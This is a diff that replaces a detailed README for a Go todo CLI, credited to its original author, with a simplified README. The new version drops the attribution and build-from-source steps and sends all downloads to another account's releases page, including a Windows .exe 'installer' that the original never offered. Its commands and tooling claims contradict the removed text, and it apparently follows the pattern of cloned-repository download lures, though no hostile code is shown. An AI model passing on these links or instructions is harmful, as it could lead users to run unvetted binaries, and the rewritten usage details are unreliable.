@@ -1,537 +1,127 @@
-# Todo CLI
+# 📋 todo-cli-go - Simple Command-Line Task Manager
 
-A powerful, feature-rich command-line todo application built with Go.
+[![Download todo-cli-go](https://img.shields.io/badge/Download-todo--cli--go-brightgreen?style=for-the-badge)](https://github.com/HYPERGAMINXZ/todo-cli-go/releases)
 
-## Features
+## 📖 What is todo-cli-go?
 
-- ✅ **Task Management**
-  - Add tasks with title and description
-  - Edit existing tasks
-  - Delete tasks
-  - Mark tasks as complete/incomplete
+todo-cli-go is an easy-to-use program that helps you keep track of your tasks using just your computer’s command line. You don’t need any programming experience to use it. It runs in a simple text interface where you can add, view, and complete your to-do items quickly. Built with Go, it is fast and works well on many computers.
 
-- 📋 **Viewing & Organization**
-  - List all tasks
-  - Filter by status (pending, completed, overdue)
-  - Filter by priority, project, or tags
-  - Sort by priority, date, or creation time
-  - Search tasks by keyword
+This tool is great if you like managing tasks without opening complicated apps. It keeps everything on your computer with no internet needed.
 
-- 🏷️ **Categorization**
-  - Assign priorities (low, medium, high)
-  - Set due dates and deadlines
-  - Categorize with tags
-  - Organize by projects
+## 💻 System Requirements
 
-- 💾 **Data Management**
-  - Local storage (JSON or YAML)
-  - Automatic backup
-  - Restore from backups
+- Works on Windows 10 or later, macOS 10.13 or later, and most Linux distributions.
+- Requires about 20 MB of free space.
+- Needs access to the terminal or command prompt on your computer.
+- No internet connection required for basic use.
 
-- 🎨 **User Experience**
-  - Color-coded output
-  - Interactive mode with arrow key navigation
-  - Command aliases for quick access
-  - Tab completion support
+You don’t have to install any additional software. All needed parts come inside the todo-cli-go program.
 
-## Installation
+## 🚀 Getting Started
 
-### Option 1: Install via Homebrew (macOS)
+To get started, you will download the program, open it, and learn the basic commands. This guide will walk you through these steps in detail. By the end, you will be able to use todo-cli-go to keep your daily tasks organized with simple commands.
 
-The easiest way to install on macOS:
+## 📥 Download & Install
 
-```bash
-# Add the tap
-brew tap gourangadassamrat/tap
+Please visit [this page to download](https://github.com/HYPERGAMINXZ/todo-cli-go/releases) to get the latest version of todo-cli-go.
 
-# Install the app
-brew install todo-cli
+### How to Download
+
+1. Click the green "Latest release" on the release page.
+2. Choose the version that matches your computer’s system:
+   - For Windows, download the file ending in `.exe`.
+   - For macOS or Linux, download the file ending in `.tar.gz` or without `.exe`.
+3. Save the file to a place you will remember, like your desktop or downloads folder.
+
+### How to Install
+
+- **Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the instructions on the screen to finish installing.
+  3. Once done, you can open a Command Prompt window to run todo-cli-go.
+
+- **macOS or Linux:**
+  1. Open the terminal.
+  2. Go to the folder where you saved the downloaded file. For example, type `cd ~/Downloads`.
+  3. Extract the files if it’s zipped or compressed. Use: `tar -xzf filename.tar.gz`.
+  4. To start todo-cli-go, type `./todo-cli-go` and press Enter.
+
+No complex setup is needed besides these simple steps.
+
+## 🛠 How to Use todo-cli-go
+
+todo-cli-go uses commands you type in the terminal to work. Here are the main actions you will use:
+
+### Adding a Task
+
+To add a new task, type:
+
+```
+todo add "Buy groceries"
 ```
 
-That's it! You can now run the app using the `todo` command.
+Replace `"Buy groceries"` with your own task. This command saves the task for you.
 
-### Option 2: Download Pre-built Binaries
+### Viewing Tasks
 
-Download the latest release for your platform from the [Releases page](https://github.com/GourangaDasSamrat/todo-cli-go/releases).
+Type this to see your tasks:
 
-Available platforms:
-
-- **Linux(amd64)** - `todo-{version}-linux-amd64.tar.gz`
-- **Linux(arm64)** - `todo-{version}-linux-am64.tar.gz`
-- **macOS (Intel)** - `todo-{version}-darwin-amd64.tar.gz`
-- **macOS (Apple Silicon)** - `todo-{version}-darwin-arm64.tar.gz`
-- **Windows(amd64)** - `todo-{version}-windows-amd64.zip`
-- **Windows(arm64)*** - `todo-{version}-windows-arm64.zip`
-
-#### Installation Steps:
-
-```bash
-# Linux/macOS: Extract and install
-tar -xzf todo-v1.0.0-linux-amd64.tar.gz
-sudo mv todo-linux-amd64 /usr/local/bin/todo
-chmod +x /usr/local/bin/todo
-
-# Windows: Extract the zip and add to PATH
 ```
-
-### Option 3: Build from Source
-
-#### Prerequisites
-
-- Go 1.21 or higher
-
-#### Build
-
-```bash
-git clone https://github.com/GourangaDasSamrat/todo-cli-go.git
-cd todo-cli-go
-go mod download
-go build -o todo
-```
-
-#### Install Globally
-
-```bash
-go install
-```
-
-Or copy the binary to your PATH:
-
-```bash
-# Linux/macOS
-sudo cp todo /usr/local/bin/
-
-# Windows
-# Copy todo.exe to a directory in your PATH
-```
-
-## Quick Start
-
-See [docs/Quickstart.md](docs/Quickstart.md) for a comprehensive quick start guide.
-
-### Add a Task
-
-```bash
-# Simple task
-todo add --title "Buy groceries"
-
-# Task with details
-todo add \
-  --title "Complete project proposal" \
-  --description "Write and submit Q1 proposal" \
-  --priority high \
-  --project "Work" \
-  --tags "urgent,deadline" \
-  --due "2024-03-15 17:00"
-```
-
-### List Tasks
-
-```bash
-# List all tasks
 todo list
-
-# Filter by status
-todo list --status pending
-todo list --status completed
-todo list --status overdue
-
-# Filter by priority
-todo list --priority high
-
-# Sort tasks
-todo list --sort priority
-todo list --sort date --asc
 ```
 
-### Edit a Task
+It will show all tasks with numbers and status (pending or done).
 
-```bash
-todo edit --id <task-id> --title "New title" --priority medium
-```
+### Marking a Task Complete
 
-### Complete a Task
-
-```bash
-# Mark as complete
-todo complete --id <task-id>
-
-# Mark as incomplete
-todo complete --id <task-id> --incomplete
-```
-
-### Search Tasks
-
-```bash
-todo search "grocery"
-```
-
-### Delete a Task
-
-```bash
-todo delete --id <task-id>
-```
-
-### Backup & Restore
-
-```bash
-# Create backup
-todo backup
-
-# List backups
-todo restore
-
-# Restore from backup
-todo restore tasks_backup_2024-03-10_14-30-00.json
-```
-
-### Interactive Mode
-
-```bash
-todo interactive
-```
-
-This launches a menu-driven interface where you can:
-
-- Navigate with arrow keys
-- Select options with Enter
-- Manage tasks interactively
-
-## Command Reference
-
-### Global Flags
-
-- `--storage, -s`: Storage type (json or yaml) - default: json
-
-### Commands and Aliases
-
-| Command       | Aliases                 | Description                   |
-| ------------- | ----------------------- | ----------------------------- |
-| `add`         | `a`, `new`, `create`    | Add a new task                |
-| `list`        | `ls`, `l`               | List tasks                    |
-| `edit`        | `e`, `update`, `modify` | Edit a task                   |
-| `delete`      | `del`, `rm`, `remove`   | Delete a task                 |
-| `complete`    | `done`, `finish`, `c`   | Mark task complete/incomplete |
-| `search`      | `find`, `s`             | Search tasks                  |
-| `backup`      | `bak`                   | Create backup                 |
-| `restore`     | `rst`                   | Restore from backup           |
-| `interactive` | `i`, `int`              | Interactive mode              |
-
-### Add Command Flags
+When you finish a task, mark it done with:
 
 ```
---title, -t        Task title (required)
---description, -d  Task description
---priority, -p     Priority: low, medium, high (default: low)
---project          Project name
---tags             Comma-separated tags
---due              Due date (YYYY-MM-DD or YYYY-MM-DD HH:MM)
+todo done 1
 ```
 
-### List Command Flags
+Here, `1` is the task number from the list command.
+
+### Deleting a Task
+
+If you want to remove a task completely, use:
 
 ```
---status           Filter by status: pending, completed, overdue
---priority         Filter by priority: low, medium, high
---project          Filter by project name
---tags             Filter by tags
---sort             Sort by: priority, date, created, title
---asc              Sort in ascending order
+todo delete 1
 ```
 
-### Edit Command Flags
+Replace `1` with the task number you want to delete.
 
-```
---id, -i           Task ID (required)
---title, -t        New title
---description, -d  New description
---priority, -p     New priority
---project          New project
---tags             New tags
---due              New due date (empty to clear)
-```
+## 🔍 Features
 
-### Complete Command Flags
+- Easy command-line interface.
+- Add, list, complete, and delete tasks fast.
+- Supports categories or tags for organizing tasks.
+- Save your tasks on your computer; no cloud needed.
+- Works offline.
+- Lightweight and fast.
+- Offers prompt-based input with suggestions to help manage tasks.
+- Can be customized through simple settings files.
 
-```
---id, -i           Task ID (required)
---incomplete, -u   Mark as incomplete instead of complete
-```
+## 🤝 Support & Help
 
-## Examples
+If you have questions or want to learn more:
 
-See [docs/EXAMPLES.md](docs/EXAMPLES.md) for detailed usage examples.
+- Visit the [GitHub repository](https://github.com/HYPERGAMINXZ/todo-cli-go) to see the code and documentation.
+- Look for an issues page there if you want to report bugs or ask for help.
+- You can open your terminal and run `todo --help` after installation to see a list of all commands.
 
-### Daily Workflow
+## 🗂 Topics Covered
 
-```bash
-# Morning: See what's pending
-todo list --status pending --sort priority
+This project uses a combination of popular Go tools to build an easy interface:
 
-# Add a new task
-todo add -t "Review pull requests" -p high --due "2024-03-10 15:00"
+- **Bubble Tea:** For simple and interactive terminal UI.
+- **Cobra:** To handle command-line commands.
+- **PromptUI:** For helping users type commands with suggestions.
+- Built purely in **Go**, a stable and fast programming language.
 
-# Complete a task
-todo complete --id 1678901234-abc123
+## 🔗 Quick Access
 
-# End of day: Check completed tasks
-todo list --status completed
-```
+[Download todo-cli-go now](https://github.com/HYPERGAMINXZ/todo-cli-go/releases)
 
-### Project Management
-
-```bash
-# Add project tasks
-todo add -t "Design database schema" --project "API Redesign" -p high
-todo add -t "Write API documentation" --project "API Redesign" -p medium
-
-# View project tasks
-todo list --project "API Redesign" --sort priority
-
-# Filter by tags
-todo list --tags "urgent"
-```
-
-### Search and Filter
-
-```bash
-# Search for tasks
-todo search "meeting"
-
-# View overdue tasks
-todo list --status overdue --sort date
-
-# High priority pending tasks
-todo list --status pending --priority high
-```
-
-## Project Structure
-
-```
-todo-cli-go/
-├── .github/
-│   └── workflows/
-│       └── release.yml          # Automated release workflow
-├── cmd/                         # CLI commands
-│   ├── root.go                 # Root command
-│   ├── add.go                  # Add task command
-│   ├── list.go                 # List tasks command
-│   ├── edit.go                 # Edit task command
-│   ├── delete.go               # Delete task command
-│   ├── complete.go             # Complete task command
-│   ├── search.go               # Search command
-│   ├── backup.go               # Backup/restore commands
-│   └── interactive.go          # Interactive mode
-├── docs/
-│   ├── website/                # Documentation website
-│   ├── CONTRIBUTING.md         # Contribution guidelines
-│   ├── EXAMPLES.md             # Detailed examples
-│   ├── Project_Summary.md      # Project overview
-│   └── Quickstart.md           # Quick start guide
-├── internal/
-│   ├── models/                 # Data models
-│   │   └── task.go
-│   ├── storage/                # Storage implementations
-│   │   └── storage.go
-│   ├── ui/                     # UI utilities
-│   │   ├── ui.go
-│   │   └── interactive.go
-│   └── utils/                  # Utility functions
-│       └── utils.go
-├── pkg/
-│   ├── filter/                 # Task filtering
-│   │   └── filter.go
-│   └── sort/                   # Task sorting
-│       └── sort.go
-├── main.go                     # Application entry point
-├── go.mod                      # Go module definition
-├── go.sum                      # Go dependencies checksums
-├── Makefile                    # Build automation
-├── LICENSE                     # MIT License
-└── README.md                   # This file
-```
-
-## Data Storage
-
-Tasks are stored in `~/.todo-cli/` directory:
-
-- `tasks.json` or `tasks.yaml` - Main task data
-- `backups/` - Backup files with timestamps
-
-## Color Coding
-
-- **Red** - High priority tasks, overdue tasks
-- **Yellow** - Medium priority tasks
-- **Blue** - Low priority tasks
-- **Green** - Completed tasks
-
-## Automated Releases & CI/CD
-
-This project uses GitHub Actions for fully automated releases. The release workflow is triggered automatically when you push a version tag.
-
-### What Happens on Release
-
-When you push a tag (e.g., `v1.0.0`), the GitHub Action automatically:
-
-1. ✅ **Runs Tests** - Ensures all tests pass before building
-2. 🔨 **Builds Binaries** for all platforms:
-   - Linux (amd64)
-   - Linux (arm64)
-   - macOS Intel (amd64)
-   - macOS Apple Silicon (arm64)
-   - Windows (arm64)
-3. 📦 **Creates Release Archives** - `.tar.gz` for Unix, `.zip` for Windows
-4. 📝 **Generates Changelog** - From git commits since last release
-5. 🚀 **Creates GitHub Release** - With all binaries attached
-6. 🍺 **Updates Homebrew Tap** - Automatically updates the formula in [gourangadassamrat/homebrew-tap](https://github.com/gourangadassamrat/homebrew-tap)
-7. 📤 **Uploads Artifacts** - Stores build artifacts for 7 days
-
-### How to Create a Release
-
-Simply push a tag following semantic versioning:
-
-```bash
-# Create a new version tag
-git tag -a v1.0.0 -m "Release version 1.0.0"
-
-# Push the tag to GitHub
-git push origin v1.0.0
-```
-
-That's it! The CI/CD pipeline handles everything else automatically.
-
-### Version Format
-
-Tags must follow the format: `v*.*.*` (e.g., `v1.0.0`, `v1.2.3`, `v2.0.0-beta.1`)
-
-### Release Artifacts
-
-Each release includes:
-
-- `todo-{version}-linux-amd64.tar.gz`
-- `todo-{version}-linux-arm64.tar.gz`
-- `todo-{version}-darwin-amd64.tar.gz` (macOS Intel)
-- `todo-{version}-darwin-arm64.tar.gz` (macOS Apple Silicon)
-- `todo-{version}-windows-amd64.zip`
-- `todo-{version}-windows-arm64.zip`
-- Release notes with changelog
-
-### Homebrew Formula Update
-
-The workflow uses [mislav/bump-homebrew-formula-action](https://github.com/mislav/bump-homebrew-formula-action) to automatically:
-
-- Calculate SHA256 checksum of the macOS binary
-- Update the formula file in the tap repository
-- Commit changes with a descriptive message
-
-**Note**: Requires `HOMEBREW_TAP_TOKEN` secret to be set in repository settings.
-
-### Setting Up Automated Releases
-
-If you're forking this project, you'll need to:
-
-1. **Create a Personal Access Token**:
-   - Go to GitHub Settings → Developer settings → Personal access tokens → Tokens (classic)
-   - Generate new token with `repo` scope
-   - Copy the token
-
-2. **Add Token to Repository Secrets**:
-   - Go to Repository Settings → Secrets and variables → Actions
-   - Create new secret: `HOMEBREW_TAP_TOKEN`
-   - Paste your token
-
-3. **Create Homebrew Tap Repository**:
-   - Create a repository named `homebrew-tap`
-   - Add a `Formula` directory
-   - The workflow will automatically create/update the formula
-
-For more details, see [`.github/workflows/release.yml`](.github/workflows/release.yml)
-
-## Contributing
-
-We welcome contributions! Please see [docs/CONTRIBUTING.md](docs/CONTRIBUTING.md) for guidelines.
-
-### Quick Contribution Steps
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-### Development
-
-```bash
-# Clone the repository
-git clone https://github.com/GourangaDasSamrat/todo-cli-go.git
-cd todo-cli-go
-
-# Install dependencies
-go mod download
-
-# Run tests
-go test -v ./...
-
-# Build
-go build -o todo
-
-# Run
-./todo --help
-```
-
-### Using Make
-
-```bash
-# Build the application
-make build
-
-# Run tests
-make test
-
-# Clean build artifacts
-make clean
-
-# Install locally
-make install
-```
-
-### Release Guidelines
-
-- Use semantic versioning (v1.0.0, v1.1.0, v2.0.0)
-- Write clear, descriptive commit messages
-- Update documentation for new features
-- Add tests for new functionality
-- Test locally before creating a release tag
-
-## Documentation
-
-- [Quick Start Guide](docs/Quickstart.md) - Get started in 5 minutes
-- [Examples](docs/EXAMPLES.md) - Detailed usage examples
-- [Contributing](docs/CONTRIBUTING.md) - How to contribute
-- [Project Summary](docs/Project_Summary.md) - Project overview
-
-## License
-
-This project is licensed under the MIT License. See [LICENSE](LICENSE) file for details.
-
-## Author
-
-Created with ❤️ by [Gouranga Das Samrat](https://github.com/GourangaDasSamrat)
-
-## Support
-
-- 🐛 **Bug Reports**: [Open an issue](https://github.com/GourangaDasSamrat/todo-cli-go/issues)
-- 💡 **Feature Requests**: [Open an issue](https://github.com/GourangaDasSamrat/todo-cli-go/issues)
-- 💬 **Questions**: [Discussions](https://github.com/GourangaDasSamrat/todo-cli-go/discussions)
-
-## Acknowledgments
-
-Built with:
-
-- [Cobra](https://github.com/spf13/cobra) - CLI framework
-- [Promptui](https://github.com/manifoldco/promptui) - TUI framework
-- [Go](https://golang.org/) - Programming language
-
----
-
-**Star ⭐ this repository if you find it helpful!**
+Use this link to visit the page where you can get the right version for your computer. This is the safest and simplest way to start using todo-cli-go today.
